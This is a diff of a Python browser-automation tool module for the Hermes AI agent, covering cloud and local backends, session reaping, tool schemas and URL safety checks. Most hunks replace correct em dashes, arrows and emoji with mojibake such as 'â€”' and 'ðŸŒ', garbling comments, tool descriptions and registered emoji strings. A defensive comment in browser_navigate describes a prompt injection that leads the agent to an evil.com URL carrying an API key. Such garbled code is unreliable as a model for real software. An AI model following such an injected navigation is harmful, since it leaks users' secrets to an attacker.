@@ -3,9 +3,9 @@
 Browser Tool Module
 
 This module provides browser automation tools using agent-browser CLI.  It
-supports multiple backends — **Browser Use** (cloud, default for Nous
+supports multiple backends â€” **Browser Use** (cloud, default for Nous
 subscribers), **Browserbase** (cloud, direct credentials), and **local
-Chromium** — with identical agent-facing behaviour.  The backend is
+Chromium** â€” with identical agent-facing behaviour.  The backend is
 auto-detected from config and available credentials.
 
 The tool uses agent-browser's accessibility tree (ariaSnapshot) for text-based
@@ -71,12 +71,12 @@ from hermes_constants import get_hermes_home
 try:
     from tools.website_policy import check_website_access
 except Exception:
-    check_website_access = lambda url: None  # noqa: E731 — fail-open if policy module unavailable
+    check_website_access = lambda url: None  # noqa: E731 â€” fail-open if policy module unavailable
 
 try:
     from tools.url_safety import is_safe_url as _is_safe_url
 except Exception:
-    _is_safe_url = lambda url: False  # noqa: E731 — fail-closed: block all if safety module unavailable
+    _is_safe_url = lambda url: False  # noqa: E731 â€” fail-closed: block all if safety module unavailable
 from tools.browser_providers.base import CloudBrowserProvider
 from tools.browser_providers.browserbase import BrowserbaseProvider
 from tools.browser_providers.browser_use import BrowserUseProvider
@@ -201,12 +201,12 @@ def _get_command_timeout() -> int:
 
 
 def _get_vision_model() -> Optional[str]:
-    """Model for browser_vision (screenshot analysis — multimodal)."""
+    """Model for browser_vision (screenshot analysis â€” multimodal)."""
     return os.getenv("AUXILIARY_VISION_MODEL", "").strip() or None
 
 
 def _get_extraction_model() -> Optional[str]:
-    """Model for page snapshot text summarization — same as web_extract."""
+    """Model for page snapshot text summarization â€” same as web_extract."""
     return os.getenv("AUXILIARY_WEB_EXTRACT_MODEL", "").strip() or None
 
 
@@ -326,19 +326,19 @@ def _get_dialog_policy_config() -> Tuple[str, float]:
 def _ensure_cdp_supervisor(task_id: str) -> None:
     """Start a CDP supervisor for ``task_id`` if an endpoint is reachable.
 
-    Idempotent — delegates to ``SupervisorRegistry.get_or_start`` which skips
+    Idempotent â€” delegates to ``SupervisorRegistry.get_or_start`` which skips
     when a supervisor for this ``(task_id, cdp_url)`` already exists and
     tears down + restarts on URL change. Safe to call on every
     ``browser_navigate`` / ``/browser connect`` without worrying about
     double-attach.
 
     Resolves the CDP URL in this order:
-      1. ``BROWSER_CDP_URL`` / ``browser.cdp_url`` — covers ``/browser connect``
+      1. ``BROWSER_CDP_URL`` / ``browser.cdp_url`` â€” covers ``/browser connect``
          and config-set overrides.
-      2. ``_active_sessions[task_id]["cdp_url"]`` — covers Browserbase + any
+      2. ``_active_sessions[task_id]["cdp_url"]`` â€” covers Browserbase + any
          other cloud provider whose ``create_session`` returns a raw CDP URL.
 
-    Swallows all errors — failing to attach the supervisor must not break
+    Swallows all errors â€” failing to attach the supervisor must not break
     the browser session itself.  The agent simply won't see
     ``pending_dialogs`` / ``frame_tree`` fields in snapshots.
     """
@@ -475,8 +475,8 @@ def _is_local_backend() -> bool:
 
     SSRF protection is only meaningful for cloud backends (Browserbase,
     BrowserUse) where the agent could reach internal resources on a remote
-    machine.  For local backends — Camofox, or the built-in headless
-    Chromium without a cloud provider — the user already has full terminal
+    machine.  For local backends â€” Camofox, or the built-in headless
+    Chromium without a cloud provider â€” the user already has full terminal
     and network access on the same machine, so the check adds no security
     value.
     """
@@ -508,7 +508,7 @@ def _socket_safe_tmpdir() -> str:
     """Return a short temp directory path suitable for Unix domain sockets.
 
     macOS sets ``TMPDIR`` to ``/var/folders/xx/.../T/`` (~51 chars).  When we
-    append ``agent-browser-hermes_…`` the resulting socket path exceeds the
+    append ``agent-browser-hermes_â€¦`` the resulting socket path exceeds the
     104-byte macOS limit for ``AF_UNIX`` addresses, causing agent-browser to
     fail with "Failed to create socket directory" or silent screenshot failures.
 
@@ -555,7 +555,7 @@ def _emergency_cleanup_all_sessions():
     Called on process exit or interrupt to prevent orphaned sessions.
 
     Also runs the orphan reaper to clean up daemons left behind by previously
-    crashed hermes processes — this way every clean hermes exit sweeps
+    crashed hermes processes â€” this way every clean hermes exit sweeps
     accumulated orphans, not just ones that actively used the browser tool.
     """
     global _cleanup_done
@@ -579,7 +579,7 @@ def _emergency_cleanup_all_sessions():
                 _recording_sessions.clear()
 
     # Sweep orphans from other crashed hermes processes.  Safe even if we
-    # never used the browser — uses owner_pid liveness to avoid reaping
+    # never used the browser â€” uses owner_pid liveness to avoid reaping
     # daemons owned by other live hermes processes.
     try:
         _reap_orphaned_browser_sessions()
@@ -589,7 +589,7 @@ def _emergency_cleanup_all_sessions():
 
 # Register cleanup via atexit only.  Previous versions installed SIGINT/SIGTERM
 # handlers that called sys.exit(), but this conflicts with prompt_toolkit's
-# async event loop — a SystemExit raised inside a key-binding callback
+# async event loop â€” a SystemExit raised inside a key-binding callback
 # corrupts the coroutine state and makes the process unkillable.  atexit
 # handlers run on any normal exit (including sys.exit), so browser sessions
 # are still cleaned up without hijacking signals.
@@ -633,7 +633,7 @@ def _write_owner_pid(socket_dir: str, session_name: str) -> None:
 
     Written atomically to ``<socket_dir>/<session_name>.owner_pid`` so the
     orphan reaper can distinguish daemons owned by a live hermes process
-    (don't reap) from daemons whose owner crashed (reap).  Best-effort —
+    (don't reap) from daemons whose owner crashed (reap).  Best-effort â€”
     an OSError here just falls back to the legacy ``tracked_names``
     heuristic in the reaper.
     """
@@ -658,7 +658,7 @@ def _reap_orphaned_browser_sessions():
     daemons whose owning hermes process is no longer alive.
 
     Ownership detection priority:
-      1. ``<session>.owner_pid`` file (written by current code) — if the
+      1. ``<session>.owner_pid`` file (written by current code) â€” if the
          referenced hermes PID is alive, leave the daemon alone regardless
          of whether it's in *this* process's ``_active_sessions``.  This is
          cross-process safe: two concurrent hermes instances won't reap each
@@ -667,7 +667,7 @@ def _reap_orphaned_browser_sessions():
          ``_active_sessions`` in the current process.  If not tracked here,
          treat as orphan (legacy behavior).
 
-    Safe to call from any context — atexit, cleanup thread, or on demand.
+    Safe to call from any context â€” atexit, cleanup thread, or on demand.
     """
     import glob
 
@@ -711,13 +711,13 @@ def _reap_orphaned_browser_sessions():
                     owner_alive = False
                 except PermissionError:
                     # Owner exists but we can't signal it (different uid).
-                    # Treat as alive — don't reap someone else's session.
+                    # Treat as alive â€” don't reap someone else's session.
                     owner_alive = True
             except (ValueError, OSError):
-                owner_alive = None  # corrupt file — fall through
+                owner_alive = None  # corrupt file â€” fall through
 
         if owner_alive is True:
-            # Owner is alive — this session belongs to a live hermes process.
+            # Owner is alive â€” this session belongs to a live hermes process.
             continue
 
         if owner_alive is None:
@@ -729,7 +729,7 @@ def _reap_orphaned_browser_sessions():
         # owner_alive is False (dead owner) OR legacy daemon not tracked here.
         pid_file = os.path.join(socket_dir, f"{session_name}.pid")
         if not os.path.isfile(pid_file):
-            # No daemon PID file — just a stale dir, remove it
+            # No daemon PID file â€” just a stale dir, remove it
             shutil.rmtree(socket_dir, ignore_errors=True)
             continue
 
@@ -747,7 +747,7 @@ def _reap_orphaned_browser_sessions():
             shutil.rmtree(socket_dir, ignore_errors=True)
             continue
         except PermissionError:
-            # Alive but owned by someone else — leave it alone
+            # Alive but owned by someone else â€” leave it alone
             continue
 
         # Daemon is alive and its owner is dead (or legacy + untracked).  Reap.
@@ -834,7 +834,7 @@ atexit.register(_stop_browser_cleanup_thread)
 BROWSER_TOOL_SCHEMAS = [
     {
         "name": "browser_navigate",
-        "description": "Navigate to a URL in the browser. Initializes the session and loads the page. Must be called before other browser tools. For simple information retrieval, prefer web_search or web_extract (faster, cheaper). Use browser tools when you need to interact with a page (click, fill forms, dynamic content). Returns a compact page snapshot with interactive elements and ref IDs — no need to call browser_snapshot separately after navigating.",
+        "description": "Navigate to a URL in the browser. Initializes the session and loads the page. Must be called before other browser tools. For simple information retrieval, prefer web_search or web_extract (faster, cheaper). Use browser tools when you need to interact with a page (click, fill forms, dynamic content). Returns a compact page snapshot with interactive elements and ref IDs â€” no need to call browser_snapshot separately after navigating.",
         "parameters": {
             "type": "object",
             "properties": {
@@ -848,7 +848,7 @@ BROWSER_TOOL_SCHEMAS = [
     },
     {
         "name": "browser_snapshot",
-        "description": "Get a text-based snapshot of the current page's accessibility tree. Returns interactive elements with ref IDs (like @e1, @e2) for browser_click and browser_type. full=false (default): compact view with interactive elements. full=true: complete page content. Snapshots over 8000 chars are truncated or LLM-summarized. Requires browser_navigate first. Note: browser_navigate already returns a compact snapshot — use this to refresh after interactions that change the page, or with full=true for complete content.",
+        "description": "Get a text-based snapshot of the current page's accessibility tree. Returns interactive elements with ref IDs (like @e1, @e2) for browser_click and browser_type. full=false (default): compact view with interactive elements. full=true: complete page content. Snapshots over 8000 chars are truncated or LLM-summarized. Requires browser_navigate first. Note: browser_navigate already returns a compact snapshot â€” use this to refresh after interactions that change the page, or with full=true for complete content.",
         "parameters": {
             "type": "object",
             "properties": {
@@ -961,7 +961,7 @@ BROWSER_TOOL_SCHEMAS = [
     },
     {
         "name": "browser_console",
-        "description": "Get browser console output and JavaScript errors from the current page. Returns console.log/warn/error/info messages and uncaught JS exceptions. Use this to detect silent JavaScript errors, failed API calls, and application warnings. Requires browser_navigate to be called first. When 'expression' is provided, evaluates JavaScript in the page context and returns the result — use this for DOM inspection, reading page state, or extracting data programmatically.",
+        "description": "Get browser console output and JavaScript errors from the current page. Returns console.log/warn/error/info messages and uncaught JS exceptions. Use this to detect silent JavaScript errors, failed API calls, and application warnings. Requires browser_navigate to be called first. When 'expression' is provided, evaluates JavaScript in the page context and returns the result â€” use this for DOM inspection, reading page state, or extracting data programmatically.",
         "parameters": {
             "type": "object",
             "properties": {
@@ -972,7 +972,7 @@ BROWSER_TOOL_SCHEMAS = [
                 },
                 "expression": {
                     "type": "string",
-                    "description": "JavaScript expression to evaluate in the page context. Runs in the browser like DevTools console — full access to DOM, window, document. Return values are serialized to JSON. Example: 'document.title' or 'document.querySelectorAll(\"a\").length'"
+                    "description": "JavaScript expression to evaluate in the page context. Runs in the browser like DevTools console â€” full access to DOM, window, document. Return values are serialized to JSON. Example: 'document.title' or 'document.querySelectorAll(\"a\").length'"
                 }
             },
             "required": []
@@ -1002,7 +1002,7 @@ def _create_cdp_session(task_id: str, cdp_url: str) -> Dict[str, str]:
     """Create a session that connects to a user-supplied CDP endpoint."""
     import uuid
     session_name = f"cdp_{uuid.uuid4().hex[:10]}"
-    logger.info("Created CDP browser session %s → %s for task %s",
+    logger.info("Created CDP browser session %s â†’ %s for task %s",
                 session_name, cdp_url, task_id)
     return {
         "session_name": session_name,
@@ -1161,7 +1161,7 @@ def _find_agent_browser() -> str:
         _agent_browser_resolved = True
         return _cached_agent_browser
     
-    # Nothing found — cache the failure so subsequent calls don't re-scan.
+    # Nothing found â€” cache the failure so subsequent calls don't re-scan.
     _agent_browser_resolved = True
     raise FileNotFoundError(
         "agent-browser CLI not found. Install it with: "
@@ -1243,23 +1243,14 @@ def _run_browser_command(
     # Local mode: --session <name> launches a local headless Chromium.
     # The rest of the command (--json, command, args) is identical.
     if session_info.get("cdp_url"):
-        # Cloud mode — connect to remote Browserbase browser via CDP
+        # Cloud mode â€” connect to remote Browserbase browser via CDP
         # IMPORTANT: Do NOT use --session with --cdp. In agent-browser >=0.13,
         # --session creates a local browser instance and silently ignores --cdp.
         backend_args = ["--cdp", session_info["cdp_url"]]
     else:
-        # Local mode — launch a headless Chromium instance
+        # Local mode â€” launch a headless Chromium instance
         backend_args = ["--session", session_info["session_name"]]
 
-    # Keep concrete executable paths intact, even when they contain spaces.
-    # Only the synthetic npx fallback needs to expand into multiple argv items.
-    cmd_prefix = ["npx", "agent-browser"] if browser_cmd == "npx agent-browser" else [browser_cmd]
-
-    cmd_parts = cmd_prefix + backend_args + [
-        "--json",
-        command
-    ] + args
-    
     try:
         # Give each task its own socket directory to prevent concurrency conflicts.
         # Without this, parallel workers fight over the same default socket path,
@@ -1270,7 +1261,7 @@ def _run_browser_command(
         )
         os.makedirs(task_socket_dir, mode=0o700, exist_ok=True)
         # Record this hermes PID as the session owner (cross-process safe
-        # orphan detection — see _write_owner_pid).
+        # orphan detection â€” see _write_owner_pid).
         _write_owner_pid(task_socket_dir, session_info['session_name'])
         logger.debug("browser cmd=%s task=%s socket_dir=%s (%d chars)",
                      command, task_id, task_socket_dir, len(task_socket_dir))
@@ -1290,6 +1281,23 @@ def _run_browser_command(
         if "AGENT_BROWSER_IDLE_TIMEOUT_MS" not in browser_env:
             idle_ms = str(BROWSER_SESSION_INACTIVITY_TIMEOUT * 1000)
             browser_env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = idle_ms
+
+        # Keep concrete executable paths intact, even when they contain spaces.
+        # Only the synthetic npx fallback needs to expand into multiple argv items.
+        if browser_cmd == "npx agent-browser":
+            resolved_npx = (
+                shutil.which("npx", path=browser_env["PATH"])
+                or shutil.which("npx.cmd", path=browser_env["PATH"])
+                or "npx"
+            )
+            cmd_prefix = [resolved_npx, "agent-browser"]
+        else:
+            cmd_prefix = [browser_cmd]
+
+        cmd_parts = cmd_prefix + backend_args + [
+            "--json",
+            command
+        ] + args
         
         # Use temp files for stdout/stderr instead of pipes.
         # agent-browser starts a background daemon that inherits file
@@ -1334,14 +1342,14 @@ def _run_browser_command(
             except OSError:
                 pass
 
-        # Log stderr for diagnostics — use warning level on failure so it's visible
+        # Log stderr for diagnostics â€” use warning level on failure so it's visible
         if stderr and stderr.strip():
             level = logging.WARNING if returncode != 0 else logging.DEBUG
             logger.log(level, "browser '%s' stderr: %s", command, stderr.strip()[:500])
         
         stdout_text = stdout.strip()
 
-        # Empty output with rc=0 is a broken state — treat as failure rather
+        # Empty output with rc=0 is a broken state â€” treat as failure rather
         # than silently returning {"success": True, "data": {}}.
         # Some commands (close, record) legitimately return no output.
         if not stdout_text and returncode == 0 and command not in _EMPTY_OK_COMMANDS:
@@ -1504,7 +1512,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with navigation result (includes stealth features info on first nav)
     """
-    # Secret exfiltration protection — block URLs that embed API keys or
+    # Secret exfiltration protection â€” block URLs that embed API keys or
     # tokens in query parameters. A prompt injection could trick the agent
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
     # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
@@ -1518,7 +1526,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
                      "Secrets must not be sent in URLs.",
         })
 
-    # SSRF protection — block private/internal addresses before navigating.
+    # SSRF protection â€” block private/internal addresses before navigating.
     # Skipped for local backends (Camofox, headless Chromium without a cloud
     # provider) because the agent already has full local network access via
     # the terminal tool.  Can also be opted out for cloud mode via
@@ -1529,7 +1537,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
             "error": "Blocked: URL targets a private or internal address",
         })
 
-    # Website policy check — block before navigating
+    # Website policy check â€” block before navigating
     blocked = check_website_access(url)
     if blocked:
         return json.dumps({
@@ -1538,7 +1546,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
             "blocked_by_policy": {"host": blocked["host"], "rule": blocked["rule"], "source": blocked["source"]},
         })
 
-    # Camofox backend — delegate after safety checks pass
+    # Camofox backend â€” delegate after safety checks pass
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_navigate
         return camofox_navigate(url, task_id)
@@ -1562,7 +1570,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         title = data.get("title", "")
         final_url = data.get("url", url)
 
-        # Post-redirect SSRF check — if the browser followed a redirect to a
+        # Post-redirect SSRF check â€” if the browser followed a redirect to a
         # private/internal address, block the result so the model can't read
         # internal content via subsequent browser_snapshot calls.
         # Skipped for local backends (same rationale as the pre-nav check).
@@ -2004,7 +2012,7 @@ def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
         }, ensure_ascii=False, default=str)
     except Exception as e:
         error_msg = str(e)
-        # Graceful degradation — server may not support eval
+        # Graceful degradation â€” server may not support eval
         if any(code in error_msg for code in ("404", "405", "501")):
             return json.dumps({
                 "success": False,
@@ -2290,7 +2298,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         return json.dumps(response_data, ensure_ascii=False)
     
     except Exception as e:
-        # Keep the screenshot if it was captured successfully — the failure is
+        # Keep the screenshot if it was captured successfully â€” the failure is
         # in the LLM vision analysis, not the capture.  Deleting a valid
         # screenshot loses evidence the user might need.  The 24-hour cleanup
         # in _cleanup_old_screenshots prevents unbounded disk growth.
@@ -2366,7 +2374,7 @@ def cleanup_browser(task_id: Optional[str] = None) -> None:
     _stop_cdp_supervisor(task_id)
 
     # Also clean up Camofox session if running in Camofox mode.
-    # Skip full close when managed persistence is enabled — the browser
+    # Skip full close when managed persistence is enabled â€” the browser
     # profile (and its session cookies) must survive across agent tasks.
     # The inactivity reaper still frees idle resources.
     if _is_camofox_mode():
@@ -2479,7 +2487,7 @@ def check_browser_requirements() -> bool:
     Returns:
         True if all requirements are met, False otherwise
     """
-    # Camofox backend — only needs the server URL, no agent-browser CLI
+    # Camofox backend â€” only needs the server URL, no agent-browser CLI
     if _is_camofox_mode():
         return True
 
@@ -2512,7 +2520,7 @@ if __name__ == "__main__":
     """
     Simple test/demo when run directly
     """
-    print("🌐 Browser Tool Module")
+    print("ðŸŒ Browser Tool Module")
     print("=" * 40)
 
     _cp = _get_cloud_provider()
@@ -2521,9 +2529,9 @@ if __name__ == "__main__":
     
     # Check requirements
     if check_browser_requirements():
-        print("✅ All requirements met")
+        print("âœ… All requirements met")
     else:
-        print("❌ Missing requirements:")
+        print("âŒ Missing requirements:")
         try:
             browser_cmd = _find_agent_browser()
             if _requires_real_termux_browser_install(browser_cmd):
@@ -2536,11 +2544,11 @@ if __name__ == "__main__":
             print(f"   - {_cp.provider_name()} credentials not configured")
             print("   Tip: set browser.cloud_provider to 'local' to use free local mode instead")
     
-    print("\n📋 Available Browser Tools:")
+    print("\nðŸ“‹ Available Browser Tools:")
     for schema in BROWSER_TOOL_SCHEMAS:
-        print(f"  🔹 {schema['name']}: {schema['description'][:60]}...")
+        print(f"  ðŸ”¹ {schema['name']}: {schema['description'][:60]}...")
     
-    print("\n💡 Usage:")
+    print("\nðŸ’¡ Usage:")
     print("  from tools.browser_tool import browser_navigate, browser_snapshot")
     print("  result = browser_navigate('https://example.com', task_id='my_task')")
     print("  snapshot = browser_snapshot(task_id='my_task')")
@@ -2559,7 +2567,7 @@ registry.register(
     schema=_BROWSER_SCHEMA_MAP["browser_navigate"],
     handler=lambda args, **kw: browser_navigate(url=args.get("url", ""), task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
-    emoji="🌐",
+    emoji="ðŸŒ",
 )
 registry.register(
     name="browser_snapshot",
@@ -2568,7 +2576,7 @@ registry.register(
     handler=lambda args, **kw: browser_snapshot(
         full=args.get("full", False), task_id=kw.get("task_id"), user_task=kw.get("user_task")),
     check_fn=check_browser_requirements,
-    emoji="📸",
+    emoji="ðŸ“¸",
 )
 registry.register(
     name="browser_click",
@@ -2576,7 +2584,7 @@ registry.register(
     schema=_BROWSER_SCHEMA_MAP["browser_click"],
     handler=lambda args, **kw: browser_click(ref=args.get("ref", ""), task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
-    emoji="👆",
+    emoji="ðŸ‘†",
 )
 registry.register(
     name="browser_type",
@@ -2584,7 +2592,7 @@ registry.register(
     schema=_BROWSER_SCHEMA_MAP["browser_type"],
     handler=lambda args, **kw: browser_type(ref=args.get("ref", ""), text=args.get("text", ""), task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
-    emoji="⌨️",
+    emoji="âŒ¨ï¸",
 )
 registry.register(
     name="browser_scroll",
@@ -2592,7 +2600,7 @@ registry.register(
     schema=_BROWSER_SCHEMA_MAP["browser_scroll"],
     handler=lambda args, **kw: browser_scroll(direction=args.get("direction", "down"), task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
-    emoji="📜",
+    emoji="ðŸ“œ",
 )
 registry.register(
     name="browser_back",
@@ -2600,7 +2608,7 @@ registry.register(
     schema=_BROWSER_SCHEMA_MAP["browser_back"],
     handler=lambda args, **kw: browser_back(task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
-    emoji="◀️",
+    emoji="â—€ï¸",
 )
 registry.register(
     name="browser_press",
@@ -2608,7 +2616,7 @@ registry.register(
     schema=_BROWSER_SCHEMA_MAP["browser_press"],
     handler=lambda args, **kw: browser_press(key=args.get("key", ""), task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
-    emoji="⌨️",
+    emoji="âŒ¨ï¸",
 )
 
 registry.register(
@@ -2617,7 +2625,7 @@ registry.register(
     schema=_BROWSER_SCHEMA_MAP["browser_get_images"],
     handler=lambda args, **kw: browser_get_images(task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
-    emoji="🖼️",
+    emoji="ðŸ–¼ï¸",
 )
 registry.register(
     name="browser_vision",
@@ -2625,7 +2633,7 @@ registry.register(
     schema=_BROWSER_SCHEMA_MAP["browser_vision"],
     handler=lambda args, **kw: browser_vision(question=args.get("question", ""), annotate=args.get("annotate", False), task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
-    emoji="👁️",
+    emoji="ðŸ‘ï¸",
 )
 registry.register(
     name="browser_console",
@@ -2633,5 +2641,5 @@ registry.register(
     schema=_BROWSER_SCHEMA_MAP["browser_console"],
     handler=lambda args, **kw: browser_console(clear=args.get("clear", False), expression=args.get("expression"), task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
-    emoji="🖥️",
+    emoji="ðŸ–¥ï¸",
 )
